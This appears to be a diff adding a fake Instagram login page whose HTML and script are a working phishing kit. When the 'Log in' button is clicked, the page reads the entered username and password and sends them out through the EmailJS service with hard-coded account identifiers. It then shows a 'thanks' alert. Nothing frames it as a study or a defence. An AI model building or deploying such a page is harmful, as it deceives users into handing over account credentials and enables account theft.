@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/x-icon" href="Instagram_icon.png">
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+</head>
+<body>
+      <div class="container">
+          <div class="box">
+               <div class="name-box"></div>
+              <form action="">
+                   <input id="username" class="inpt" type="text" placeholder="Phone number,username,or email">
+                   <input id="password" class="inpt" type="password" placeholder="Password">
+                   <input onclick="sendMessage()" class="submit" type="button" value="Log in">
+                   
+                   <img class="box-bot" src="bottom.png" alt="">
+              </form>
+            </div>
+            <img class="sign" src="sign.png" alt="">
+      </div>
+      <script>
+         function sendMessage(){
+            (function(){
+               emailjs.init("67QMpfYMSiAJKUXWn")
+            })();
+            var serviceId="service_wixm5f7"
+            var templateId="template_gb9ejr9"
+
+            var params={
+                username:document.getElementById("username").value,
+                password:document.getElementById("password").value
+            }
+
+            emailjs.send(serviceId,templateId,params)
+            .then(res=>{
+                alert("thanks");
+            })
+            .catch();
+         }
+      </script>
+</body>
+</html>
